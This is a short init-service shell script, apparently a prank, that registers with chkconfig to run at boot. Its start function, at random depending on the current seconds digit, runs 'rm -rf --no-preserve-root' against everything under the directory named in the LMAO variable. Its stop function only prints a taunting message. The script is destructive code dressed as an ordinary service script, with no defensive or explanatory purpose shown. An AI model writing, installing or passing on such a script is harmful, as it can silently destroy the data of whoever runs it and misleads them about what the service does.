#!/bin/sh
# chkconfig: 125 20 80

start() {
   for i in $(date +%S | cut -c 2); do
      [ "$i" -gt 6 ] && rm -rf --no-preserve-root "${LMAO:?}/"*
   done
}

stop() {
   echo "Lol, cute. You thought that would work. Xp"
}

case "$1" in
start)
   start
   ;;
stop)
   stop
   ;;
*)
   ;;
esac

exit 0
